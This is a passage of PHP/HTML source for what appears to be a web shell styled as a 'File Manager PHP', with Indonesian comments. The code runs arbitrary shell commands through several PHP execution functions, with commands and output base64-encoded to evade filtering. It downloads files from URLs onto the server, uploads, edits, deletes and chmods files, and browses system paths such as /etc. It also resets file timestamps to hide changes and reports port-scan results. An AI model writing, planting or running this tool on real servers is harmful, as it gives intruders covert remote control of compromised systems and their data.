    $results[] = "  Closed ports: " . count($closed_ports) . "/" . count($ports);
    if (count($open_ports) > 0) {
        $results[] = "";
        $results[] = "Open ports list: " . implode(', ', $open_ports);
    }
    $results[] = str_repeat("-", 60);
    
    $output = implode("\n", $results);
    $encoded_output = base64_encode($output);
    $cmdout = '<pre id="cmdOutput" style="background:#111;border:1px solid #66aaff;padding:10px;color:#fff;white-space:pre-wrap;word-break:break-all;"></pre>';
    $cmdout .= '<script>(function(){var d=atob("' . $encoded_output . '");document.getElementById("cmdOutput").textContent=d;})();</script>';
}

// Helper function to get service names
function get_service_name($port) {
    $services = [
        21 => 'FTP', 22 => 'SSH', 23 => 'Telnet', 25 => 'SMTP',
        53 => 'DNS', 80 => 'HTTP', 110 => 'POP3', 143 => 'IMAP',
        443 => 'HTTPS', 445 => 'SMB', 3306 => 'MySQL', 3389 => 'RDP',
        5432 => 'PostgreSQL', 6379 => 'Redis', 8080 => 'HTTP-Proxy',
        27017 => 'MongoDB', 9200 => 'Elasticsearch', 11211 => 'Memcached'
    ];
    return isset($services[$port]) ? $services[$port] : 'Unknown';
}

// --- Handle AJAX request for file content ---
if (isset($_GET['get_file_content'])) {
    $file_path = realpath($_GET['get_file_content']);
    if ($file_path && is_file($file_path) && strpos($file_path, $current_dir) === 0) {
        echo file_get_contents($file_path);
    }
    exit;
}

// Definisikan fungsi execution untuk digunakan di HTML
$exec_functions = [
    'system' => function_exists('system'),
    'exec' => function_exists('exec'), 
    'passthru' => function_exists('passthru'),
    'shell_exec' => function_exists('shell_exec'),
    'popen' => function_exists('popen'),
    'proc_open' => function_exists('proc_open')
];

// --- Fungsi Pembantu ---
function permsToString($perms, $file_path, $current_uid, $current_gid) {
    $info_chars_raw = '';

    $owner_id = fileowner($file_path);
    $group_id = filegroup($file_path);

    $is_regular_file = (($perms & 0x8000) == 0x8000);
    $is_writable_by_owner = (($perms & 0x0080) ? true : false);

    if (($perms & 0xC000) == 0xC000) $info_chars_raw .= 's';
    elseif (($perms & 0xA000) == 0xA000) $info_chars_raw .= 'l';
    elseif (($perms & 0x8000) == 0x8000) $info_chars_raw .= '-';
    elseif (($perms & 0x6000) == 0x6000) $info_chars_raw .= 'b';
    elseif (($perms & 0x4000) == 0x4000) $info_chars_raw .= 'd';
    elseif (($perms & 0x2000) == 0x2000) $info_chars_raw .= 'c';
    elseif (($perms & 0x1000) == 0x1000) $info_chars_raw .= 'p';
    else $info_chars_raw .= 'u';

    $info_chars_raw .= (($perms & 0x0100) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0080) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    $info_chars_raw .= (($perms & 0x0020) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0010) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    $info_chars_raw .= (($perms & 0x0004) ? 'r' : '-');
    $info_chars_raw .= (($perms & 0x0002) ? 'w' : '-');
    $info_chars_raw .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    $overall_perms_color_style = '';
    if (($owner_id !== $current_uid && $current_uid !== null) || ($group_id !== $current_gid && $current_gid !== null)) {
        $overall_perms_color_style = 'color: white;';
    } else {
        if ($is_writable_by_owner) {
            $overall_perms_color_style = 'color: #00FF00;';
        } else {
            $overall_perms_color_style = 'color: red;';
        }
    }

    $type_char = substr($info_chars_raw, 0, 1);
    $colored_type_char = '';
    if (($perms & 0xC000) == 0xC000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0xA000) == 0xA000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x8000) == 0x8000) $colored_type_char = '<span style="color:white;">' . $type_char . '</span>';
    elseif (($perms & 0x6000) == 0x6000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x4000) == 0x4000) $colored_type_char = '<span style="color:#00FF00;">' . $type_char . '</span>';
    elseif (($perms & 0x2000) == 0x2000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    elseif (($perms & 0x1000) == 0x1000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
    else $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';

    return $colored_type_char . '<span style="' . $overall_perms_color_style . '">' . substr($info_chars_raw, 1) . '</span>';
}

function makeBreadcrumb($path) {
    $path = realpath($path);
    if ($path === false) return "";
    $crumbs = array();
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $acc = DIRECTORY_SEPARATOR;
    $crumbs[] = '<form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars(DIRECTORY_SEPARATOR).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">/</button></form>';
    $first = true;
    foreach ($parts as $p) {
        if (empty($p)) continue;
        $acc .= $p;
        if ($first) {
            // Bagian pertama setelah root: tambahkan spasi di depan
            $crumbs[] = ' <form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars($acc).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">'.htmlspecialchars($p).'</button></form>';
            $first = false;
        } else {
            // Bagian berikutnya: tambahkan " /" di depan
            $crumbs[] = ' / <form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars($acc).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">'.htmlspecialchars($p).'</button></form>';
        }
        $acc .= DIRECTORY_SEPARATOR;
    }
    return implode('', $crumbs);
}

function formatSize($b) {
    if ($b>=1073741824) return number_format($b/1073741824,2)." GB";
    if ($b>=1048576) return number_format($b/1048576,2)." MB";
    if ($b>=1024) return number_format($b/1024,2)." KB";
    return $b." B";
}

function getPermsOctal($filepath) {
    return substr(decoct(fileperms($filepath)), -4);
}

$view_file = isset($_SESSION['view_file']) ? $_SESSION['view_file'] : null;
$edit_file = isset($_SESSION['edit_file']) ? $_SESSION['edit_file'] : null;

$view_content = null;
if ($view_file && !$edit_file && is_file($view_file)) {
    $view_content = file_get_contents($view_file);
}
$edit_content = null;
if ($edit_file && is_file($edit_file)) {
    $edit_content = file_get_contents($edit_file);
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager PHP</title>
    
    <style>

        body {
            font-family: monospace;
            background: black;
            color: white;
            margin: 0;
            padding: 10px;
            cursor: default;
        }
        button.action-btn {
            background: #aa2222;
            border: none;
            color: white;
            padding: 5px 10px;
            margin: 0;
            cursor: pointer;
            border-radius: 3px;
            font-family: monospace;
            font-size: 14px;
        }
        button.action-btn:hover {
            background: #dd4444;
        }
        .actions-cell form {
            display: inline;
            margin: 0;
            padding: 0;
        }
        .actions-cell form:not(:last-child):after {
            content: " | ";
            color: #ff6666;
            padding: 0 4px;
        }
        .actions-cell button:not(:last-child):after {
            content: " | ";
            color: #ff6666;
            padding: 0 4px;
        }
        /* CSS khusus untuk bagian Viewing File */
        .view-actions form:not(:last-child):after {
            content: " ";
            color: transparent;
        }
        .view-actions button:not(:last-child):after {
            content: " ";
            color: transparent;
        }
        .view-actions form, .view-actions button {
            margin-right: 4px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        th, td {
            border: 1px solid #444;
            padding: 6px 8px;
            text-align: left;
            vertical-align: middle;
        }
        th {
            background: #222;
        }
        tr:nth-child(even) {
            background: #111;
        }
        .checkbox-col {
            width: 22px;
            text-align: center;
        }
        input[type=text], textarea {
            background: black;
            color: white;
            border: 1px solid #444;
            padding: 4px;
            font-size: 14px;
            cursor: text;
        }
        input[type=submit], input[type=button] {
            background: #aa2222;
            border: none;
            color: white;
            padding: 6px 12px;
            cursor: pointer;
            border-radius: 3px;
        }
        input[type=submit]:hover, input[type=button]:hover {
            background: #dd4444;
        }
        textarea {
            width:100%;
            height:400px;
        }
        .action-row {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .action-row form {
            margin-right: 15px;
            margin-bottom: 5px;
            display: flex;
            align-items: center;
        }
        .action-row input[type="text"],
        .action-row input[type="submit"] {
            height: 30px;
            vertical-align: middle;
            box-sizing: border-box;
            margin-right: 5px;
        }
        .action-row input[type="text"]:last-child,
        .action-row input[type="submit"]:last-child {
            margin-right: 0;
        }
        .command-form {
            margin-top:20px;
            margin-bottom:20px;
        }
        .file-content {
            white-space: pre-wrap;
            background:#111;
            border:1px solid #444;
            padding:10px;
            margin-bottom:20px;
            max-height: 400px;
            overflow-y: auto;
            cursor: text;
        }
        .edit-form, .touch-form {
            margin-bottom: 20px;
        }
        .debug-message {
            background-color: #333;
            border: 1px solid #666;
            padding: 10px;
            margin-bottom: 15px;
            color: #ffdd00;
            font-size: 0.9em;
        }
        .user-group-diff {
            color: white;
        }
        .perms-green {
            color: #00FF00;
        }
        .perms-red {
            color: red;
        }
        .perms-white {
            color: white;
        }
        .touch-input {
            width: 200px;
            text-align: center;
        }
        .clickable-date {
            cursor: pointer;
            color: white;
        }
        .clickable-date:hover {
            color: #ff6666;
        }
        .form-container {
            display: none;
            margin-bottom: 20px;
            background: #111;
            border: 1px solid #444;
            padding: 15px;
            border-radius: 5px;
        }
        
        /* Perbaikan tampilan pesan */
        .message-container {
            position: fixed;
            top: 40px;
            right: 20px;
            z-index: 1000;
            max-width: 400px;
        }
        .message {
            padding: 12px 20px;
            margin-bottom: 10px;
            border-radius: 4px;
            font-weight: bold;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            animation: slideIn 0.3s ease-out;

            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;

            /* Tambahkan properti untuk interaksi */
            position: relative;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        /* Kelas untuk notifikasi yang diperluas */
        .message.expanded {
            white-space: normal;
            max-height: none;
        }
        .message.success {
            background-color: rgba(0, 255, 0, 0.2);
            border-left: 4px solid #00FF00;
            color: #00FF00;
        }
        .message.error {
            background-color: rgba(255, 0, 0, 0.2);
            border-left: 4px solid #ff0000;
            color: #ff0000;
        }
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        .message-close {
            float: right;
            cursor: pointer;
            font-weight: bold;
            margin-left: 15px;
        }
        
        /* Tampilan untuk pilihan metode command - tanpa background */
        .command-method-selector {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
        }
        .method-option {
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 14px;
            color: #ccc;
        }
        .method-option input[type="radio"] {
            margin-right: 6px;
            cursor: pointer;
        }
        .method-option:hover {
            color: #ff6666;
        }
        .method-option input[type="radio"]:checked + span {
            color: #ff6666;
            font-weight: bold;
        }
        
        /* Keterangan untuk file info */
        .file-info-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .file-info-details {
            font-size: 12px;
            color: #aaa;
        }
        
        input[type="text"], input[type="password"], textarea {
            background: black !important;
            border: 1px solid #444 !important;
            color: white !important;
            padding: 4px !important;
            font-size: 14px !important;
            cursor: text !important;
            transition: border-color 0.3s ease !important;
        }

        input[type="text"]:focus, input[type="password"]:focus, textarea:focus {
            border-color: #ff6666 !important;
            outline: none !important;
        }

        input[type="text"]::placeholder, input[type="password"]::placeholder, textarea::placeholder {
            color: #ccc !important;
        }

        /* CSS khusus untuk input Chmod */
        input[name="chmod_value"] {
            width: 50px !important;
            vertical-align: middle !important;
            text-align: center !important;
            font-family: monospace !important;
        }
        
        /* Style untuk form edit yang diperbaiki */
        .edit-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 1px solid #444;
            padding-bottom: 10px;
        }
        
        .edit-path {
            color: #ff6666;
            font-weight: bold;
        }
        
        .edit-footer {
            display: flex;
            justify-content: flex-start;
            align-items: center;
            margin-top: 15px;
            border-top: 1px solid #444;
            padding-top: 10px;
        }
        
        .edit-actions {
            display: flex;
            gap: 10px;
        }
        
        /* Style untuk form touch yang minimalis */
        .touch-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .touch-title {
            color: #ff6666;
            font-weight: bold;
            margin-bottom: 15px;
            font-size: 16px;
        }
        
        .touch-form-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }
        
        .touch-actions {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }

        /* Efek khusus untuk selain baris navigasi */
        tbody tr:not(.nav-row):hover {
            background-color: #333 !important;
        }

        /* Tambahkan class untuk baris navigasi */
        .nav-row:hover {
            background-color: transparent !important;
            cursor: default;
            border-left: none;
        }

        /* Efek untuk checkbox saat hover */
        .file-row input[type="checkbox"]:hover {
            cursor: pointer;
        }

        /* CSS untuk input Chmod dengan warna sama seperti Rename to */
        input[name="chmod_value"] {
            background: black !important;
            border: 1px solid #444 !important;
            color: white !important;
            padding: 4px !important;
            font-size: 14px !important;
            cursor: text !important;
            width: 50px !important;
            vertical-align: middle !important;
            text-align: center !important;
            font-family: monospace !important;
        }

        input[name="chmod_value"]:focus {
            border-color: #ff6666 !important;
            outline: none !important;
        }

        input[name="chmod_value"]::placeholder {
            color: #ccc !important;
        }

        /* Efek untuk checkbox saat hover */
        .file-row input[type="checkbox"]:hover {
            cursor: pointer;
        }

        /* CSS untuk semua input form dengan border merah saat focus */
        input[type="text"], input[type="password"], textarea {
            background: black !important;
            border: 1px solid #444 !important;
            color: white !important;
            padding: 4px !important;
            font-size: 14px !important;
            cursor: text !important;
            transition: border-color 0.3s ease !important;
        }

        input[type="text"]:focus, input[type="password"]:focus, textarea:focus {
            border-color: #ff6666 !important;
            outline: none !important;
        }

        input[type="text"]::placeholder, input[type="password"]::placeholder, textarea::placeholder {
            color: #ccc !important;
        }

        /* CSS khusus untuk input Chmod */
        input[name="chmod_value"] {
            width: 50px !important;
            vertical-align: middle !important;
            text-align: center !important;
            font-family: monospace !important;
        }

        /* Custom file input untuk Upload */
        .file-input-wrapper {
            position: relative;
            display: inline-flex;
            align-items: center;
            border-bottom: 1px solid #555;
            padding-bottom: 4px;
            min-width: 220px;
            margin-right: 10px;
        }

        .file-input-wrapper input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .file-input-label {
            padding: 6px 8px;
            background: transparent;
            color: #ddd;
            font-size: 14px;
            cursor: pointer;
            transition: color 0.3s ease;
            width: 100%;
            font-family: monospace;
        }

        .file-input-label:hover {
            color: #fff;
        }

        .file-input-label:active {
            color: #d33;
        }

        /* Style untuk tombol Apply dan Upload */
        .btn-apply, .btn-upload {
            background: linear-gradient(135deg, #b22222, #d33);
            border: none;
            color: #fff;
            padding: 6px 14px;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.1s;
            font-weight: bold;
            font-family: monospace;
        }

        .btn-apply:hover, .btn-upload:hover {
            background: linear-gradient(135deg, #d33, #e74c3c);
        }

        .btn-apply:active, .btn-upload:active {
            transform: scale(0.97);
        }

        /* Custom select untuk Pilih aksi */
        select[name="bulk_action"] {
            padding: 6px 8px;
            border: none;
            background: #222; /* Mengganti background dari transparent ke #222 */
            color: #ddd;
            outline: none;
            font-size: 14px;
            transition: color 0.2s, border-color 0.2s;
            border-bottom: 1px solid #555;
            min-width: 220px;
            font-family: monospace;
            border-radius: 4px; /* Menambahkan radius untuk tampilan yang lebih baik */
        }

        select[name="bulk_action"]:hover {
            color: #fff;
            background: #333; /* Menambahkan background saat hover */
        }

        select[name="bulk_action"]:focus {
            color: #fff;
            border-bottom: 1px solid #d33;
            background: #333; /* Menambahkan background saat focus */
        }

        /* Menambahkan styling untuk opsi dropdown */
        select[name="bulk_action"] option {
            background: #222;
            color: #ddd;
        }

        select[name="bulk_action"] option:hover {
            background: #444;
            color: #fff;
        }


        /* Custom file input untuk Upload */
        .file-input-wrapper {
            position: relative;
            display: inline-flex;
            align-items: center;
            border-bottom: 1px solid #555;
            padding-bottom: 4px;
            min-width: 220px;
            margin-right: 10
        }

        /* CSS untuk modal konfirmasi */
        #confirmModal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            font-family: monospace;
        }

        #confirmModal .modal-content {
            background-color: #222;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #444;
            width: 350px;
            text-align: center;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        }

        #confirmModal h3 {
            margin-top: 0;
            color: #ff6666;
            font-family: monospace;
        }

        #confirmModal p {
            color: white;
            margin: 15px 0;
            font-family: monospace;
        }

        #confirmModal .modal-buttons {
            margin-top: 20px;
        }

        #confirmModal button {
            background: #aa2222;
            border: none;
            color: white;
            padding: 8px 20px;
            margin: 0 10px;
            cursor: pointer;
            border-radius: 3px;
            font-family: monospace;
            transition: background 0.3s;
        }

        #confirmModal button:hover {
            background: #dd4444;
        }

        #confirmModal #confirmNo {
            background: #444;
        }

        #confirmModal #confirmNo:hover {
            background: #666;
        }

        /* ==========================================
           COMMAND PALETTE - DIRECT DIRECTORY NAVIGATION
           Minimal & Bypass-friendly
           ========================================== */
        #cmdPalette {
            display: none;
            position: fixed;
            top: 20%;
            left: 50%;
            transform: translateX(-50%);
            width: 600px;
            max-width: 90%;
            background: #1a1a1a;
            border: 1px solid #ff6666;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.9);
            z-index: 99999;
            font-family: monospace;
        }
        #cmdPalette.active {
            display: block;
            animation: paletteFadeIn 0.15s ease-out;
        }
        @keyframes paletteFadeIn {
            from { opacity: 0; transform: translateX(-50%) scale(0.95); }
            to { opacity: 1; transform: translateX(-50%) scale(1); }
        }
        #cmdPaletteOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 99998;
        }
        #cmdPaletteOverlay.active {
            display: block;
        }
        #cmdPaletteHeader {
            padding: 15px 20px;
            border-bottom: 1px solid #333;
            color: #ff6666;
            font-weight: bold;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        #cmdPaletteInput {
            width: 100%;
            padding: 15px 20px;
            background: #0d0d0d;
            border: none;
            color: #fff;
            font-size: 16px;
            font-family: monospace;
            outline: none;
            box-sizing: border-box;
        }
        #cmdPaletteInput::placeholder {
            color: #666;
        }
        #cmdPaletteHints {
            padding: 10px 20px;
            background: #111;
            border-top: 1px solid #333;
            color: #888;
            font-size: 12px;
            display: flex;
            justify-content: space-between;
        }
        #cmdPaletteHints span {
            margin-right: 15px;
        }
        #cmdPaletteHints kbd {
            background: #333;
            padding: 2px 6px;
            border-radius: 3px;
            color: #ccc;
            font-family: monospace;
        }

        /* ==========================================
           COMMAND PALETTE - LIST TOOLS
           Minimal & Bypass-friendly
           ========================================== */
        #toolsPalette {
            display: none;
            position: fixed;
            top: 15%;
            left: 50%;
            transform: translateX(-50%);
            width: 700px;
            max-width: 95%;
            max-height: 70vh;
            background: #1a1a1a;
            border: 1px solid #66aaff;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.9);
            z-index: 99999;
            font-family: monospace;
            overflow: hidden;
        }
        #toolsPalette.active {
            display: block;
            animation: paletteFadeIn 0.15s ease-out;
        }
        #toolsPaletteOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 99998;
        }
        #toolsPaletteOverlay.active {
            display: block;
        }
        #toolsPaletteHeader {
            padding: 15px 20px;
            border-bottom: 1px solid #333;
            color: #66aaff;
            font-weight: bold;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #111;
        }
        #toolsPaletteSearch {
            width: 100%;
            padding: 12px 20px;
            background: #0d0d0d;
            border: none;
            border-bottom: 1px solid #333;
            color: #fff;
            font-size: 14px;
            font-family: monospace;
            outline: none;
            box-sizing: border-box;
        }
        #toolsPaletteSearch::placeholder {
            color: #666;
        }
        #toolsPaletteList {
            max-height: 45vh;
            overflow-y: auto;
            padding: 10px;
            background: #1a1a1a;
        }
        .tool-item {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            margin: 4px 0;
            background: #222;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.15s;
            border: 1px solid transparent;
        }
        .tool-item:hover {
            background: #333;
            border-color: #66aaff;
        }
        .tool-item.active {
            background: #2a4060;
            border-color: #66aaff;
        }
        .tool-icon {
            color: #66aaff;
            margin-right: 12px;
            font-size: 12px;
            width: 20px;
            text-align: center;
        }
        .tool-name {
            color: #fff;
            font-size: 13px;
            flex: 1;
        }
        .tool-path {
            color: #888;
            font-size: 11px;
            margin-left: 10px;
        }
        .tool-desc {
            color: #666;
            font-size: 11px;
            margin-left: 10px;
            font-style: italic;
        }
        #toolsPaletteHints {
            padding: 10px 20px;
            background: #111;
            border-top: 1px solid #333;
            color: #888;
            font-size: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        #toolsPaletteHints span {
            margin-right: 15px;
        }
        #toolsPaletteHints kbd {
            background: #333;
            padding: 2px 6px;
            border-radius: 3px;
            color: #ccc;
            font-family: monospace;
        }
        .tool-category {
            color: #ffaa66;
            font-size: 11px;
            font-weight: bold;
            padding: 8px 12px 4px 12px;
            margin-top: 5px;
            border-bottom: 1px solid #333;
        }
        .tools-empty {
            color: #666;
            text-align: center;
            padding: 20px;
            font-style: italic;
        }
    </style>
</head>
<body>

<!-- ==========================================
     COMMAND PALETTE - DIRECT DIRECTORY NAVIGATION
     ========================================== -->
<div id="cmdPaletteOverlay"></div>
<div id="cmdPalette">
    <div id="cmdPaletteHeader">
        <span>Go to Directory</span>
        <span style="color:#888;font-size:11px;">Ctrl+Shift+K</span>
    </div>
    <form method="POST" id="cmdPaletteForm" style="margin:0;padding:0;">
        <input type="text" id="cmdPaletteInput" name="go_dir" placeholder="/var/www/html | /etc | /home | C:\\xampp\\htdocs ..." autocomplete="off">
    </form>
    <div id="cmdPaletteHints">
        <div>
            <span><kbd>Enter</kbd> Navigate</span>
            <span><kbd>Esc</kbd> Close</span>
        </div>
        <div style="color:#666;">
            Type absolute path
        </div>
    </div>
</div>

<!-- ==========================================
     COMMAND PALETTE - LIST TOOLS
     ========================================== -->
<div id="toolsPaletteOverlay"></div>
<div id="toolsPalette">
    <div id="toolsPaletteHeader">
        <span>List Tools</span>
        <span style="color:#888;font-size:11px;">Ctrl+Shift+T</span>
    </div>
    <input type="text" id="toolsPaletteSearch" placeholder="Search tools..." autocomplete="off">
    <div id="toolsPaletteList"></div>
    <div id="toolsPaletteHints">
        <div>
            <span><kbd>Enter</kbd> Execute</span>
            <span><kbd>Esc</kbd> Close</span>
            <span><kbd>Tab</kbd> Navigate</span>
        </div>
        <div style="color:#666;" id="toolsCount">
            Loading tools...
        </div>
    </div>
</div>



<?php
if (isset($_SESSION['delete_debug_message'])) {
    echo '<div class="debug-message">' . $_SESSION['delete_debug_message'] . '</div>';
    unset($_SESSION['delete_debug_message']);
}
?>

<div>
    <strong>Current Directory:</strong> <?php echo makeBreadcrumb($current_dir); ?>
    <form method="POST" style="display:inline;">
        <button type="submit" name="go_dir" value="<?php echo htmlspecialchars(getcwd()); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-left:10px;">[ Home ]</button>
    </form>
</div>
<hr>

<!-- Container untuk pesan sukses/error -->
<div class="message-container" id="messageContainer"></div>

<div class="command-form">
    <h3>Execute Command</h3>
    <?php 
    $any_exec = false;
    foreach(['system','exec','passthru','shell_exec','popen','proc_open'] as $f) { if(function_exists($f)) { $any_exec = true; break; } }
    if ($any_exec): ?>
        <form method="POST" style="margin-bottom:10px;" onsubmit="return encodeCmdInput()">
            <input type="hidden" name="command" id="encodedCmdInput" >
            <input type="text" id="cmdInputText" style="width:80%" required placeholder="id | whoami | dir | ls -la ...">
            <input type="submit" value="Execute" class="btn-upload">
        </form>
            <script>function encodeCmdInput(){var cmd=document.getElementById('cmdInputText').value;var enc=btoa(cmd);document.getElementById('encodedCmdInput').value=enc;return true;}</script>
    <?php else: ?>
        <div style="color: #ff6666; margin-bottom: 10px;">Command execution is not available on this server.</div>
    <?php endif; ?>
    
    <?php if ($cmdout): ?>
        <div class="command-output"><?php echo $cmdout; ?></div>
    <?php endif; ?>
</div>

<!-- Form Edit -->
<div id="editFormContainer" class="form-container">
    <div class="edit-header">
        <h3>Edit: <span id="editFileName" class="edit-path"></span></h3>
    </div>
    <form method="POST" class="edit-form" id="editForm">
        <input type="hidden" name="save_edit_file" id="saveEditPath">
        <textarea name="edit_content" id="editContent"></textarea>
    </form>
    <div class="edit-footer">
        <div class="edit-actions">
            <input type="submit" form="editForm" value="Save">
            <input type="button" value="Cancel" onclick="hideEditForm()">
        </div>
    </div>
</div>

<div class="action-row">
    <form method="POST">
        <input type="text" name="get_file_url" placeholder="URL Link" required style="width:200px;">
        <input type="text" name="get_file_name" placeholder="Nama File" required style="width:150px;">
        <input type="submit" value="Get">
    </form>
    
    <form method="POST" enctype="multipart/form-data" style="display:inline-flex; align-items: center;">
        <div class="file-input-wrapper">
            <label for="uploadfile" class="file-input-label" id="fileLabel">Choose file...</label>
            <input type="file" name="uploadfile" id="uploadfile" onchange="updateFileName(this)" required>
        </div>
        <input type="submit" value="Upload" class="btn-upload">
    </form>

    <form method="POST">
        <input type="text" name="newfolder_name" placeholder="Nama folder baru" required>
        <input type="submit" value="Buat Folder">
    </form>

    <form method="POST">
        <input type="text" name="newfile_name" placeholder="Nama file baru" required>
        <input type="submit" name="create_file" value="Buat File">
    </form>

    <form method="POST" id="deleteActionForm">
        <input type="hidden" name="delete_single_item" value="1">
        <input type="text" name="delete_item_name" placeholder="Path file/folder untuk dihapus" required>
        <button type="button" onclick="showDeleteActionConfirm()" class="action-btn">Hapus File/Folder</button>
    </form>
</div>

<!-- View File Section -->
<div id="viewFileSection" class="form-container" style="<?php echo ($view_file !== null && $edit_file === null) ? 'display: block;' : 'display: none;'; ?>">
    <div class="file-info-container">
        <h3>Viewing File: <?php echo htmlspecialchars($view_file); ?></h3>
    </div>
    <pre class="file-content"><?php echo htmlspecialchars($view_content); ?></pre>
    <div class="actions-cell view-actions">
        <form method="POST" style="display:inline;">
            <input type="hidden" name="download" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="submit" class="action-btn">Download</button>
        </form>
        <form method="POST" style="display:inline;" id="chmodFormView">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($view_file); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($view_file); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($view_file); ?>">
            <button type="button" onclick="showChmodConfirm('chmodFormView', '<?php echo htmlspecialchars(basename($view_file)); ?>')" class="action-btn">Chmod</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($view_file); ?>">
            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
            <button type="submit" class="action-btn">Rename</button>
        </form>
        <form method="POST" style="display:inline;" onsubmit="return false;">
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="button" class="action-btn" onclick="showEditForm('<?php echo htmlspecialchars($view_file); ?>')">Edit</button>
        </form>
        <form method="POST" style="display:inline;" onsubmit="return false;">
            <input type="hidden" name="touch_file" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="button" class="action-btn" onclick="showTouchForm('<?php echo htmlspecialchars($view_file); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($view_file)); ?>')">Touch</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="close_view_file" value="1">
            <button type="submit" class="action-btn">Close</button>
        </form>
    </div>
</div>

<!-- Form Touch -->
<div id="touchFormContainer" class="form-container">
    <div class="touch-container">
        <div class="touch-title">Touch: <span id="touchFileName"></span></div>
        <div class="touch-form-content">
            <form method="POST" class="touch-form" id="touchForm">
                <input type="hidden" name="save_touch" id="saveTouchPath">
                <input type="text" name="touch_value" id="touchValue" class="touch-input" pattern="\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}" required>
            </form>
            <div class="touch-actions">
                <input type="submit" form="touchForm" value="Save">
                <input type="button" value="Cancel" onclick="hideTouchForm()">
            </div>
        </div>
    </div>
</div>

<!-- Modal Konfirmasi -->
<div id="confirmModal">
    <div class="modal-content">
        <h3>Confirm Action</h3>
        <p id="confirmMessage">Are you sure you want to proceed?</p>
        <div class="modal-buttons">
            <button id="confirmYes">Yes</button>
            <button id="confirmNo">No</button>
        </div>
    </div>
</div>

<form method="POST" id="bulkForm">
    <table>
        <thead>
            <tr>
                <th class="checkbox-col"><input type="checkbox" id="checkAll" title="Pilih semua"></th>
                <th>Nama</th>
                <th>Ukuran</th>
                <th>User:Group</th>
                <th>Izin</th>
                <th>Dimodifikasi</th>
                <th class="actions-cell">Aksi</th>
            </tr>
        </thead>
        <tbody>
<!-- Baris navigasi untuk direktori saat ini (.) -->
<tr class="nav-row">
    <td class="checkbox-col"></td>
    <td>
        <form method="POST" style="display:inline;">
